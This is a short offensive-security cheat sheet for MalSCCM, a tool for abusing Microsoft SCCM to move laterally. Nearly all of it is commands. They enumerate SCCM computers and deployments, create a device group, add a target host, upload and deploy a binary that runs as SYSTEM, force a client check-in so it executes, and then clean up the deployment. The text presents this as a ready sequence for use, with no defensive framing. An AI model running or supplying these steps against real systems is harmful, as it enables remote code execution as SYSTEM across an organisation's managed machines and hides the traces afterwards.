### Source
```
https://github.com/nettitude/MalSCCM
```


### List possible targets for lateral movement using SCCM
```
MalSCCM.exe inspect /computers
```

### Check whether the Distribution Point is also the Primary Site (central management location)
```
MalSCCM.exe inspect /server:<distributionPointServerFqdn> /groups
```

### List Computers, Groups, PrimaryUser, Forest, Packages, Applications and Deployments
```
MalSCCM.exe inspect /all /server:<distributionPointServerFqdn>
```

### Create new group for deployment
```
MalSCCM.exe group /create /groupname:<newGroup> /grouptype:device
```

### Add target computer to group
```
MalSCCM.exe group /addhost /groupname:<newGroup> /host:<computer>
```

### Add application and upload binary that will be executed as SYSTEM
```
MalSCCM.exe app /create /name:<appName> /uncpath:"\\<distributionPointServerFqdn>\SCCMContentLib$\<file>.exe"
```

### Check if application exists
```
MalSCCM.exe inspect /applications
```

### Deploy application
```
MalSCCM.exe app /deploy /name:<appName> /groupname:<newGroup> /assignmentname:<deploymentName>
```

### Initiate checkin (trigger installation as soon as possible)
```
MalSCCM.exe checkin /groupname:<newGroup>
```

### Check deployment status
```
MalSCCM.exe inspect /deployments
```

### Remove deployments of applications 
```
MalSCCM.exe app /cleanup /name:<appName>
```

